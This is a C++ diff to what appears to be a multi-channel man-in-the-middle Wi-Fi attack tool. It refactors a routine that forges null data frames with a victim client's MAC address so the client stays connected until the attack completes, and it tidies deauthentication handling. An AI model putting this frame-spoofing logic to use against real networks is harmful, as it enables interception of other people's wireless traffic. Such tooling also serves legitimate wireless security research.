@@ -126,6 +126,26 @@ bool McMitm::handle_auth_from_client_real(HWAddress<6> addr1, const Dot11 &dot11
    return false;
 }
 
+void McMitm::power_mgmt_response(HWAddress<6> addr2, const Dot11 &dot11) const{
+    if(dot11.addr1() == ap_mac){
+        // Sleep mode detection
+        if(dot11.power_mgmt() && clients.contains(addr2)){
+            const auto &client = clients.at(addr2);
+            if(client->state < ClientState::Attack_Done){
+                log(LogLevel::WARNING, "Client {} is going to sleep on real channel.", addr2);
+                Dot11Data null_frame{};
+                null_frame.type(Dot11::DATA);
+                null_frame.subtype(Dot11::DATA_NULL);
+                null_frame.addr1(ap_mac);
+                null_frame.addr2(addr2);
+                null_frame.addr3(ap_mac);
+                sock_real->send(null_frame, netconfig.real_channel);
+            }
+        }
+    }
+}
+
+
 void McMitm::send_to_real(PDU &pdu) const{ sock_real->send(pdu, netconfig.real_channel); }
 void McMitm::send_to_real(const std::vector<uint8_t> &raw) const{
     sock_real->send(raw, netconfig.real_channel);
@@ -146,34 +166,17 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_
         return;
     }
 
+    power_mgmt_response(addr2, *dot11);
+
     if (handle_probe_real(addr2, *dot11)) return;
     //TODO if(handle_action_real(addr2, *pdu, raw, *dot11)) return;
     if(handle_eapol_real(addr2, addr1, *dot11)) return;
     if(handle_auth_from_client_real(addr1, *dot11)) return;
 
     if(dot11->addr1() == ap_mac){
+        if(clients.contains(addr2) || addr2 == client_mac) display_traffic(*dot11, "Real channel");
         // STA -> AP
-       if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()){
-            display_traffic(*dot11, "Real channel");
-            del_client(addr2);
-        } else if(clients.contains(addr2) || addr2 == client_mac){
-            display_traffic(*dot11, "Real channel");
-        }
-
-        // Sleep mode detection
-        if(dot11->power_mgmt() && clients.contains(addr2)){
-            const auto &client = clients.at(addr2);
-            if(client->state < ClientState::Attack_Done){
-                log(LogLevel::WARNING, "Client {} is going to sleep on real channel.", addr2);
-                Dot11Data null_frame{};
-                null_frame.type(Dot11::DATA);
-                null_frame.subtype(Dot11::DATA_NULL);
-                null_frame.addr1(ap_mac);
-                null_frame.addr2(addr2);
-                null_frame.addr3(ap_mac);
-                sock_real->send(null_frame, netconfig.real_channel);
-            }
-        }
+        if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()) del_client(addr2);
     } else if(addr2 == ap_mac){ // AP -> STA
         handle_from_ap_real(pdu, *dot11, addr1);
     } else if(dot11->addr1() == client_mac || addr2 == client_mac){
